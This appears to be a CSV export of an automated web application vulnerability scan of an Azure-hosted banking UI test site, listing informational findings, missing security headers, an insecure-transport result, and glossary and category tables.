+Certificate yes Comodo_'Sabre'_CT_log sabre.ct.comodo.com/ 5581d4c2169036014aea0b9b573c53f0c0e43878702508172fa3aa1d0713d30c Mon_18_Dec_2023_08:47:23_AM_GMT
+","Certificate Fingerprint:00CF19054BB3EFFC62AAABC1196C42753EBDB19191BBBF8AD950CFA62D01AE78
+"
+"fint-int-digitalbankingui-nra.azurewebsites","INFORMATION_GATHERED","3261571","150010","Number of links: 2
+https://portal.azure.com/
+https://go.microsoft.com/fwlink/?linkid=2095007
+","16 Feb 2024 12:08AM GMT+0530","d5181f79-075e-494b-a032-861fe553e5b3","","","","","","",""
+"fint-int-digitalbankingui-nra.azurewebsites","INFORMATION_GATHERED","3261587","45038","","16 Feb 2024 12:08AM GMT+0530","29c55a19-9835-44d6-ba20-e98674debefd","","","fint-int-digitalbankingui-nra.azurewebsites.net","20.192.170.11","","Scan duration: 2217 seconds
+Start time: Thu Feb 15 18:38:31 UTC 2024
+End time: Thu Feb 15 19:15:28 UTC 2024",""
+"fint-int-digitalbankingui-nra.azurewebsites","INFORMATION_GATHERED","3261576","6","","16 Feb 2024 12:08AM GMT+0530","d97cd7ab-afd0-4dac-a471-ecf5973739a7","","","20.192.170.11","20.192.170.11","","#table
+IP_address Host_name
+20.192.170.11 No_registered_hostname
+",""
+"GLOSSARY"
+"QID","Id","Title","Category","Severity Level","Groups","OWASP","WASC","CWE","CVSS Base","CVSS Temporal","Description","Impact","Solution","CVSS V3 Base","CVSS V3 Temporal","CVSS V3 Attack Vector"
+"QID","6","DNS Host Name","Information Gathered","1","DIAG","","","",,,"The fully qualified domain name of this host, if it was obtained from a DNS server, is displayed in the RESULT section.","N/A","N/A",,,""
+"QID","38116","SSL Server Information Retrieval","Information Gathered","1","DIAG","","","",,,"<P>The following is a list of supported SSL ciphers.<P>
+Note: If a cipher is included in this list it means that it was possible to establish a SSL connection using that cipher. There are some web servers setups that allow connections to be established using a LOW grade cipher, only to provide a web page stating that the URL is accessible only through a non-LOW grade cipher. In this case even though LOW grade cipher will be listed here QID 38140 will not be reported.
+<P>
+","N/A","N/A",,,""
+"QID","38291","SSL Session Caching Information","Information Gathered","1","DIAG","","","",,,"SSL session is a collection of security parameters that are negotiated by the SSL client and server for each SSL connection. SSL session caching is targeted to reduce the overhead of negotiations in recurring SSL connections. SSL sessions can be reused to resume an earlier connection or to establish multiple simultaneous connections. The client suggests an SSL session to be reused by identifying the session with a Session-ID during SSL handshake. If the server finds it appropriate to reuse the session,  then they both proceed to secure communication with already known security parameters.
+<P>
+This test determines if SSL session caching is enabled on the host.","SSL session caching is part of the SSL and TLS protocols and is not a security threat. The result of this test is for informational purposes only.","N/A",,,""
+"QID","38597","Secure Sockets Layer/Transport Layer Security (SSL/TLS) Invalid Protocol Version Tolerance","Information Gathered","1","DIAG","","","",,,"SSL/TLS protocols have different version that can be supported by both the client and the server. This test attempts to send invalid protocol versions to the target in order to find out what is the target's behavior. The results section contains a table that indicates what was the target's response to each of our tests.","N/A","N/A",,,""
+"QID","38600","SSL Certificate will expire within next six months","Information Gathered","1","DIAG","","","",,,"Certificates are used for authentication purposes in different protocols such as SSL/TLS. Each certificate has a validity period outside of which it is supposed to be considered invalid. This QID is reported to inform that a certificate will expire within next six months. The advance notice can be helpful since obtaining a certificate can take some time.","Expired certificates can cause connection disruptions or compromise the integrity and privacy of the connections being protected by the certificates.","Contact the certificate authority that signed your certificate to arrange for a renewal.",,,""
+"QID","38704","Secure Sockets Layer/Transport Layer Security (SSL/TLS) Key Exchange Methods","Information Gathered","1","DIAG","","","",,,"The following is a list of SSL/TLS key exchange methods supported by the server, along with their respective key sizes, strengths and ciphers.","N/A","N/A",,,""
+"QID","38706","Secure Sockets Layer/Transport Layer Security (SSL/TLS) Protocol Properties","Information Gathered","1","DIAG","","","",,,"The following is a list of detected SSL/TLS protocol properties."," Items include:<P><UL>
+<LI>Extended Master Secret: indicates whether the extended_master_secret extension is supported or required by the server. This extension enhances security and is recommended. Applicable to TLSv1, TLSv1.1, TLSv1.2, DTLSv1, DTLSv1.2</LI>
+<LI>Encrypt Then MAC: indicates whether the encrypt_then_mac extension is supported or required by the server. This extension enhances the security of non-AEAD ciphers and is recommended. Applicable to TLSv1, TLSv1.1, TLSv1.2, DTLSv1, DTLSv1.2</LI>
+<LI>Heartbeat: indicates whether the heartbeat extension is supported. It is not recommended to enable this, except for DTLS. Applicable to TLSv1, TLSv1.1, TLSv1.2, TLSv1.3, DTLSv1, DTLSv1.2</LI>
+<LI>Truncated HMAC: indicates whether the truncated_hmac extension is supported. This can degrade security and is not recommended. Applicable to TLSv1, TLSv1.1, TLSv1.2, DTLSv1, DTLSv1.2</LI>
+<LI>Cipher priority: indicates whether client, server or both determine the priority of ciphers. Having the server determine the priority is recommended. Applicable to SSLv3, TLSv1, TLSv1.1, TLSv1.2, TLSv1.3, DTLSv1, DTLSv1.2</LI>
+</UL>
+","N/A",,,""
+"QID","38717","Secure Sockets Layer (SSL) Certificate Online Certificate Status Protocol (OCSP) Information","Information Gathered","1","DIAG","","","",,,"<P>OCSP (Online Certificate Status Protocol) is a protocol to determine the status of an SSL certificate, specifically whether a certificate has been revoked by the issuing certificate authority. SSL servers can provide the OCSP status of their certificate as part of the SSL/TLS handshake. This information is referred to as ""Status Request"" or ""OCSP Stapling"".
+","N/A","N/A",,,""
+"QID","38718","Secure Sockets Layer (SSL) Certificate Transparency Information","Information Gathered","1","DIAG","","","",,,"<P>SSL Certificate Transparency is an industry effort to improve visibility into the process of how certificate authorities issue certificates. It is designed to allow the owners of domain names to find all certificates that have been issued for their domains, and which certificate authorities have issued them. This is done by requiring certificate authorities to publish all issued certificates in public logs. TLS servers can then provide cryptographic evidence to TLS clients that the server certificate has been registered in public logs, thus providing some degree of confidence that the certificate is legitimate. Such cryptographic evidence is referred to as an ""SCT Log Proof"".
+<P>The information below lists all validated SCT Log Proofs for server certificates along with information about the public log, where available.
+","N/A","N/A",,,""
+"QID","42350","TLS Secure Renegotiation Extension Support Information","Information Gathered","1","DIAG","","","",,,"Secure Socket Layer (SSL) and Transport Layer Security (TLS) renegotiation are vulnerable to an attack in which the attacker forms a TLS connection with the target server, injects content of his choice, and then splices in a new TLS connection from a client. The server treats the client's initial TLS handshake as a renegotiation and thus believes that the initial data transmitted by the attacker is from the same entity as the subsequent client data. TLS protocol was extended to cryptographically tierenegotiations to the TLS connections they are being performed over. This is referred to as TLS secure renegotiation extension. This detection determines whether the TLS secure renegotiation extension is supported by the server or not.","N/A","N/A",,,""
+"QID","45038","Host Scan Time - Scanner","Information Gathered","1","DIAG","","","",,,"The Host Scan Time is the period of time it takes the scanning engine to perform the vulnerability assessment of a single target host. The Host Scan Time for this host is reported in the Result section below. 
+<P>
+The Host Scan Time does not have a direct correlation to the Duration time as displayed in the Report Summary section of a scan results report. The Duration is the period of time it takes the service to perform a scan task. The Duration includes the time it takes the service to scan all hosts, which may involve parallel scanning. It also includes the time it takes for a scanner appliance to pick up the scan task and transfer the results back to the service's Secure Operating Center. Further, when a scan task is distributed across multiple scanners, the Duration includes the time it takes to perform parallel host scanning on all scanners.
+<P>","N/A","N/A",,,""
+"QID","86002","SSL Certificate - Information","Information Gathered","1","DIAG","","","",,,"SSL certificate information is provided in the Results section.","N/A","N/A",,,""
+"QID","150009","Links Crawled","Information Gathered","1","DIAG","","","",,,"The list of unique links crawled and HTML forms submitted by the scanner appear in the Results section. This list may contain fewer links than the maximum threshold defined. 
+<P>NOTE: This list also includes:<BR>
+- All the unique links that are reported in QID 150140 (Redundant links/URL paths crawled and not crawled)<BR>
+- All the forms reported in QID 150152 (Forms Crawled)<BR> 
+- All the forms in QID 150115 (Authentication Form Found)<BR>
+- Certain requests from QID 150172 (Requests Crawled)","N/A","N/A",,,""
+"QID","150010","External Links Discovered","Information Gathered","1","DIAG","","","",,,"External links discovered during the scan are listed in the Results section. These links were out of scope for the scan and were not crawled.","N/A","N/A",,,""
+"QID","150018","Connection Error Occurred During Web Application Scan","Information Gathered","2","DIAG","","","",,,"The following are some of the possible reasons for the timeouts or connection errors:
+<OL>
+<LI> A disturbance in network connectivity between the scanner and the web application occurred.</LI>
+<LI> The web server or application server hosting the application was taken down in the midst of a scan.</LI>
+<LI> The web application experienced an overload, possibly due to load generated by the scan.</LI>
+<LI> An error occurred in the SSL/TLS handshake (applies to HTTPS web applications only).</LI>
+<LI> A security device, such as an IDS/IPS or web application firewall (WAF), began to drop or reject the HTTP connections from the scanner.</LI>
+<LI> Very large files like PDFs, videos, etc. are present on the site and caused timeouts when accessed by the scanner.</LI>
+</OL>","Some of the links were not crawled or scanned. Results may be incomplete or incorrect.","First, confirm that the server was not taken down in the midst of the scan.  After that, investigate the root cause by reviewing the listed links and examining web server logs, application server logs, or IDS/IPS/WAF logs. If the errors are caused due to load generated by the scanner then try reducing the scan intensity (this could increase the scan duration). If the errors are due to specific URLs being tested by the scanner or due to specific form data sent by the scanner, then configure exclude lists in the scan configuration as needed to avoid such requests. If timeouts or connection errors are a persistent issue but you want the scan to run to completion, change the Behavior Settings in the option profile to increase the error thresholds or disable the error checks entirely.",,,""
+"QID","150020","Links Rejected By Crawl Scope or Exclusion List","Information Gathered","1","DIAG","","","",,,"One or more links were not crawled because of an explicit rule to exclude them. This also occurs if a link is malformed.
+<P>
+Exclude list and Include list entries can cause links to be rejected. If a scan is limited to a specific starting directory, then links outside that directory will neither be crawled or tested.
+<P>
+Links that contain a host name or IP address different from the target application are considered external links and not crawled by default; those types of links are not listed here. This often happens when the scope of a scan is limited to the directory of the starting URL. The scope can be changed in the Web Application Record.
+<P>
+During the test phase, some path-based tests may be rejected if the scan is limited to the directory of the starting URL and the test would fall outside that directory. In these cases, the number of rejected links may be too high to list in the Results section.","Links listed here were neither crawled or tested by the Web application scanning engine.","A link might have been intentionally matched by a exclude or include list entry. Verify that no links in this list were unintentionally rejected.",,,""
+"QID","150021","Scan Diagnostics","Information Gathered","1","DIAG","","","",,,"This check provides various details of the scan's performance and behavior. In some cases, this check can be used to identify problems that the scanner encountered when crawling the target Web application.","The scan diagnostics data provides technical details about the crawler's performance and behavior. This information does not necessarily imply problems with the Web application.","No action is required.",,,""
+"QID","150152","Forms Crawled","Information Gathered","1","DIAG","","","",,,"The Results section lists the unique forms that were identified and submitted by the scanner. The forms listed in this QID do not include authentication forms (i.e. login forms), which are reported separately under QID 150115.<P>
+
+The scanner does a redundancy check on forms by inspecting the form fields. Forms determined to be the redundant based on identical form fields will not be tested. If desired, you can enable 'Include form action URI in form uniqueness calculation' in the WAS option profile to have the scanner also consider the form's action attribute in the redundancy check.<P>
+
+NOTE: Any regular expression specified under 'Redundant Links' are not applied to forms. Forms (unique or redundant) are not reported under QID 150140.","N/A","N/A",,,""
+"QID","150202","Missing header: X-Content-Type-Options","Information Gathered","2","WEAK","A5","WASC-15","CWE-16,CWE-1032",,,"The X-Content-Type-Options response header is not present. WAS reports missing X-Content-Type-Options header on each crawled link for both static and dynamic responses. The scanner performs the check not only on 200 responses but 4xx and 5xx responses as well. It's also possible the QID will be reported on directory-level links.","All web browsers employ a content-sniffing algorithm that inspects the contents of HTTP responses and also occasionally overrides the MIME type provided by the server. If X-Content-Type-Options header is not present, browsers can potentially be tricked into treating non-HTML response as HTML. An attacker can then potentially leverage the functionality to perform a cross-site scripting (XSS) attack. This specific case is known as a Content-Sniffing XSS (CS-XSS) attack.
+
+
+
+","It is recommended to disable browser content sniffing by adding the X-Content-Type-Options header to the HTTP response with a value of 'nosniff'. Also, ensure that the 'Content-Type' header is set correctly on responses.
+",,,""
+"QID","150204","Missing header: X-XSS-Protection","Information Gathered","1","WEAK","A5","WASC-15","CWE-16,CWE-1032",,,"The X-XSS-Protection response header is not present.
+","The X-XSS-Protection response header provides a layer of protection against reflected cross-site scripting (XSS) attacks by instructing browsers to abort rendering a page in which a reflected XSS attack has been detected. This is a best-effort second line of defense measure which helps prevent an attacker from using evasion techniques to avoid the neutralization mechanisms that the filters use by default. When configured appropriately, browser-level XSS filters can provide additional layers of defense against web application attacks.
+<P>
+Note that HTTP 4xx and 5xx responses can also be susceptible to attacks such as XSS. For better security the X-XSS-Protection header should be set on 4xx and 5xx responses as well.","It is recommend to set X-XSS-Protection header with value set to '1; mode=block' on all the relevant responses to activate browser's XSS filter.
+
+<P><B>NOTE:</B> The X-XSS-Protection header is not supported by all browsers. Google Chrome and Safari are some of the browsers which support it, Firefox on the other hand does not support the header. X-XSS-Protection header does not guarantee a complete protection against XSS. For better protection against XSS attacks, the web application should use secure coding principles. Also, consider leveraging the Content-Security-Policy (CSP) header, which is supported by all browsers.
+
+<P>Using X-XSS-Protection could have unintended side effects, please understand the implications carefully before using it.
+
+<P>References:<BR>
+- <A HREF=""https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-XSS-Protection"" TARGET=""_blank"">https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-XSS-Protection</A><BR>
+- <A HREF=""https://blog.innerht.ml/the-misunderstood-x-xss-protection/"" TARGET=""_blank"">https://blog.innerht.ml/the-misunderstood-x-xss-protection/</A><BR>
+- <A HREF=""https://www.mbsd.jp/blog/20160407.html"" TARGET=""_blank"">https://www.mbsd.jp/blog/20160407.html</A><BR>
+- <A HREF=""https://www.chromium.org/developers/design-documents/xss-auditor"" TARGET=""_blank"">https://www.chromium.org/developers/design-documents/xss-auditor</A>",,,""
+"QID","150206","Content-Security-Policy Not Implemented","Information Gathered","2","WEAK","A5","WASC-15","CWE-16,CWE-1032",,,"No Content-Security-Policy (CSP) is specified for the page. WAS checks for the missing CSP on all static and dynamic pages. It checks for CSP in the response headers (Content-Security-Policy, X-Content-Security-Policy or X-Webkit-CSP) and in response body (http-equiv=""Content-Security-Policy"" meta tag).<P>
+
+HTTP 4xx and 5xx responses can also be susceptible to attacks such as XSS. For better security it's important to set appropriate CSP policies on 4xx and 5xx responses as well.
+","Content-Security Policy is a defense mechanism that can significantly reduce the risk and impact of XSS attacks in modern browsers. The CSP specification provides a set of content restrictions for web resources and a mechanism for transmitting the policy from a server to a client where the policy is enforced. When a Content Security Policy is specified, a number of default behaviors in user agents are changed; specifically inline content and JavaScript eval constructs are not interpreted without additional directives. In short, CSP allows you to create a whitelist of sources of the trusted content. The CSP policy instructs the browser to only render resources from those whitelisted sources. Even though an attacker can find a security vulnerability in the application through which to inject script, the script won't match the whitelisted sources defined in the CSP policy, and therefore will not be executed.<P>
+
+The absence of Content Security Policy in the response will allow the attacker to exploit vulnerabilities as the protection provided by the browser is not at all leveraged by the Web application. If secure CSP configuration is not implemented, browsers will not be able to block content-injection attacks such as Cross-Site Scripting and Clickjacking.
+
+","Appropriate CSP policies help prevent content-injection attacks such as cross-site scripting (XSS) and clickjacking. It's recommended to add secure CSP policies as a part of a defense-in-depth approach for securing web applications.<P>
+
+References:<BR>
+- <A HREF=""https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html"" TARGET=""_blank"">https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html</A><BR>
+- <A HREF=""https://developers.google.com/web/fundamentals/security/csp/"" TARGET=""_blank"">https://developers.google.com/web/fundamentals/security/csp/</A>
+
+
+
+",,,""
+"QID","150208","Missing header: Referrer-Policy","Information Gathered","2","WEAK","A5","WASC-15","CWE-16,CWE-1032",,,"No Referrer Policy is specified for the link. WAS checks for the missing Referrer Policy on all static and dynamic pages. It checks for one of the following Referrer Policy in the response headers:<P>
+1) no-referrer<BR>
+2) no-referrer-when-downgrade<BR>
+3) same-origin<BR>
+4) origin<BR>
+5) origin-when-cross-origin<BR>
+6) strict-origin<BR>
+7) strict-origin-when-cross-origin<BR>
+<P>
+If the Referrer Policy header is not found , WAS checks in response body for meta tag containing tag name as ""referrer"" and one of the above Referrer Policy.","The Referrer-Policy header controls how much referrer information is sent to a site when navigating to it. Absence of Referrer-Policy header can lead to leakage of sensitive information via the referrer header.
+","Referrer Policy header improves security by ensuring websites don't leak sensitive information via the referrer header. It's recommended to add secure Referrer Policies as a part of a defense-in-depth approach.<P>
+
+References:<BR>
+- <A HREF=""https://www.w3.org/TR/referrer-policy/"" TARGET=""_blank"">https://www.w3.org/TR/referrer-policy/</A><BR>
+- <A HREF=""https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy"" TARGET=""_blank"">https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy</A>
+",,,""
+"QID","150248","Missing header: Permissions-Policy","Information Gathered","2","WEAK","A5","","CWE-284",,,"The Permissions-Policy response header is not present.","Permissions-Policy allows web developers to selectively enable, disable, or modify the behavior of some of the browser features and APIs within their application.<P>
+A user agent has a set of supported features(Policy Controlled Features), which is the set of features which it allows to be controlled through policies.<P> 
+Not defining policy for unused and risky policy controlled features may leave application vulnerable.<P>","It is recommended to define policy for policy controlled features to make application more secure.<P>
+
+References:<BR>
+<A HREF=""https://www.w3.org/TR/permissions-policy-1/"" TARGET=""_blank"">Permissions-Policy W3C Working Draft</A><BR>
+<A HREF=""https://github.com/w3c/webappsec-permissions-policy/blob/main/features.md"" TARGET=""_blank"">Policy Controlled Features</A><BR>",,,""
+"QID","150262","Missing header: Feature-Policy","Information Gathered","2","WEAK","A5","WASC-15","CWE-16,CWE-1032",,,"The Feature-Policy response header is not present. ","Feature Policy allows web developers to selectively enable, disable, and modify the behavior of certain APIs and web features such as ""geolocation"",""camera"", ""usb"", ""fullscreen"", ""animations"" etc in the browser.
+<P> 
+These policies restrict what APIs the site can access or modify the browser's default behavior for certain features.","It is recommended to set the Feature-Policy header to selectively enable, disable, and modify the behavior of certain APIs and web features.<P>
+
+References:<BR>
+- <A HREF=""https://www.w3.org/TR/feature-policy/"" TARGET=""_blank"">https://www.w3.org/TR/feature-policy/</A><BR>
+- <A HREF=""https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Feature-Policy"" TARGET=""_blank"">https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Feature-Policy</A>",,,""
+"QID","150263","Insecure Transport","Confirmed Vulnerability","3","INFO","A2","WASC-4","CWE-319","6.4","5.8","A link is functional over an insecure, HTTP connection. No redirection to HTTPS occurs.  Note that this QID is reported for 200/OK responses as well as 4xx and 5xx responses.","Data sent over a non-HTTPS connection is unencrypted and vulnerable to network sniffing attacks that can expose sensitive or confidential information. This includes non-secure cookies and other potentially sensitive data contained in HTTP headers. Even if no sensitive data is transmitted, man-in-the-middle (MITM) attacks are possible over non-HTTPS connections. An attacker who exploits MITM can intercept and change the conversation between the client (e.g., web browser, mobile device, etc.) and the server.<P>
+
+More information: <A HREF=""https://developers.google.com/web/fundamentals/security/encrypt-in-transit/why-https"" TARGET=""_blank"">Why HTTPS Matters</A>","Ensure that all links are accessible over HTTPS only. The most secure design is for the application to listen and respond only to encrypted HTTPS requests. Alternatively, if non-HTTPS requests are accepted, the server should redirect these requests to HTTPS using a 301 or 302 response.<P>
+
+It is also strongly recommended to use <A HREF=""https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Strict_Transport_Security_Cheat_Sheet.html"" TARGET=""_blank"">HTTP Strict Transport Security</A> (HSTS) so that web browsers are instructed to use only HTTPS when making requests to the server. QID 150135 will be reported when links without HSTS are found.<P>
+
+For more information, see the <A HREF=""https://cheatsheetseries.owasp.org/cheatsheets/Transport_Layer_Protection_Cheat_Sheet.html#application"" TARGET=""_blank"">Application section of OWASP's Transport Layer Protection Cheat Sheet</A>.","7.6","6.6","Network"
+"QID","150528","Server Returns HTTP 4XX Error Code During Scanning","Information Gathered","1","DIAG","","","",,,"During the WAS scan, links with HTTP 4xx response code were observed and these are listed in the Results section. The HTTP 4xx message indicates a client error. The list of supported 4xx response code are as below:
+
+<P>400 - Bad Request<BR>
+401 - Unauthorized<BR>
+403 - Forbidden<BR>
+404 - Not Found<BR>
+405 - Method Not Allowed<BR>
+407 - Proxy Authentication Required<BR>
+408 - Request Timeout<BR>
+413 - Payload Too Large<BR>
+414 - URI Too Long<BR>
+
+
+","The presence of a HTTP 4xx error during the crawl phase indicates that some problem exists on the website that will be encountered during normal usage of the Web application. Note WAS depends on responses to detect many vulnerabilities if the link does not respond with an expected response then any vulnerabilities present on such links may not be detected.","Review each link to determine why the client encountered an error while requesting the link. Additionally review and investigate the results of QID 150042 which lists 5xx errors, QID 150019 which lists unexpected response codes and QID 150097 which lists a potential blocked request. ",,,""
+"QID","150546","First Link Crawled Response Code Information","Information Gathered","1","DIAG","","","",,,"The Web server returned the following information from where the Web application scanning engine initiated. 
+Information reported includes First Link Crawled, response Code, response Header, and response Body (first 500 characters). 
+The first link crawled is the ""Web Application URL (or Swagger file URL)"" set in the Web Application profile.","An erroneous response might be indicative of a problem in the Web server, or the scan configuration.","Review the information to check if this is in line with the expected scan configuration. Refer to the output of QIDs 150009, 150019, 150021, 150042 and 150528 (if present) for additional details.",,,""
+"GROUP","Name","Category"
+"GROUP","PATH","VULNERABILITY"
+"GROUP","CC","SENSITIVE_CONTENT"
+"GROUP","DIAG","INFORMATION_GATHERED"
+"GROUP","BUGCROWD","VULNERABILITY"
+"GROUP","SSN-US","SENSITIVE_CONTENT"
+"GROUP","WEAK","INFORMATION_GATHERED"
+"GROUP","CUSTOM","SENSITIVE_CONTENT"
+"GROUP","XSS","VULNERABILITY"
+"GROUP","INFO","VULNERABILITY"
+"GROUP","COMPLIANCE","VULNERABILITY"
+"GROUP","BURP","VULNERABILITY"
+"GROUP","SQL","VULNERABILITY"
+"OWASP","Code","Name"
+"OWASP","A1","Broken Access Control"
+"OWASP","A2","Cryptographic Failures"
+"OWASP","A3","Injection"
+"OWASP","A4","Insecure Design"
+"OWASP","A5","Security Misconfiguration"
+"OWASP","A6","Vulnerable and Outdated Components"
+"OWASP","A7","Identification and Authentication Failures"
+"OWASP","A8","Software and Data Integrity Failures"
+"OWASP","A9","Security Logging and Monitoring Failures"
+"OWASP","A10","Server Side Request Forgery (SSRF)"
+"WASC","Code","Name"
+"WASC","WASC-1","INSUFFICIENT AUTHENTICATION"
+"WASC","WASC-2","INSUFFICIENT AUTHORIZATION"
+"WASC","WASC-3","INTEGER OVERFLOWS"
+"WASC","WASC-4","INSUFFICIENT TRANSPORT LAYER PROTECTION"
+"WASC","WASC-5","REMOTE FILE INCLUSION"
+"WASC","WASC-6","FORMAT STRING"
+"WASC","WASC-7","BUFFER OVERFLOW"
+"WASC","WASC-8","CROSS-SITE SCRIPTING"
+"WASC","WASC-9","CROSS-SITE REQUEST FORGERY"
+"WASC","WASC-10","DENIAL OF SERVICE"
+"WASC","WASC-11","BRUTE FORCE"
+"WASC","WASC-12","CONTENT SPOOFING"
+"WASC","WASC-13","INFORMATION LEAKAGE"
+"WASC","WASC-14","SERVER MISCONFIGURATION"
+"WASC","WASC-15","APPLICATION MISCONFIGURATION"
+"WASC","WASC-16","DIRECTORY INDEXING"
+"WASC","WASC-17","IMPROPER FILESYSTEM PERMISSIONS"
+"WASC","WASC-18","CREDENTIAL/SESSION PREDICTION"
+"WASC","WASC-19","SQL INJECTION"
+"WASC","WASC-20","IMPROPER INPUT HANDLING"
+"WASC","WASC-21","INSUFFICIENT ANTI-AUTOMATION"
+"WASC","WASC-22","IMPROPER OUTPUT HANDLING"
+"WASC","WASC-23","XML INJECTION"
+"WASC","WASC-24","HTTP REQUEST SPLITTING"
+"WASC","WASC-25","HTTP RESPONSE SPLITTING"
+"WASC","WASC-26","HTTP REQUEST SMUGGLING"
+"WASC","WASC-27","HTTP RESPONSE SMUGGLING"
+"WASC","WASC-28","NULL BYTE INJECTION"
+"WASC","WASC-29","LDAP INJECTION"
+"WASC","WASC-30","MAIL COMMAND INJECTION"
+"WASC","WASC-31","OS COMMANDING"
+"WASC","WASC-32","ROUTING DETOUR"
+"WASC","WASC-33","PATH TRAVERSAL"
+"WASC","WASC-34","PREDICTABLE RESOURCE LOCATION"
+"WASC","WASC-35","SOAP ARRAY ABUSE"
+"WASC","WASC-36","SSI INJECTION"
+"WASC","WASC-37","SESSION FIXATION"
+"WASC","WASC-38","URL REDIRECTOR ABUSE"
+"WASC","WASC-39","XPATH INJECTION"
+"WASC","WASC-40","INSUFFICIENT PROCESS VALIDATION"
+"WASC","WASC-41","XML ATTRIBUTE BLOWUP"
+"WASC","WASC-42","ABUSE OF FUNCTIONALITY"
+"WASC","WASC-43","XML EXTERNAL ENTITIES (XXE)"
+"WASC","WASC-44","XML ENTITY EXPANSION"
+"WASC","WASC-45","FINGERPRINTING"
+"WASC","WASC-46","XQUERY INJECTION"
+"WASC","WASC-47","INSUFFICIENT SESSION EXPIRATION"
+"WASC","WASC-48","INSECURE INDEXING"
+"WASC","WASC-49","INSUFFICIENT PASSWORD RECOVERY"
+"APPENDIX"
+"Web Application Name","URL","Owner","Scope","ID","Tags","Custom Attributes"
+"fint-int-digitalbankingui-nra.azurewebsites","https://fint-int-digitalbankingui-nra.azurewebsites.net","Dixith Thirukkovalluru (fntsu8dt)","Limit to URL hostname","36092606","",""
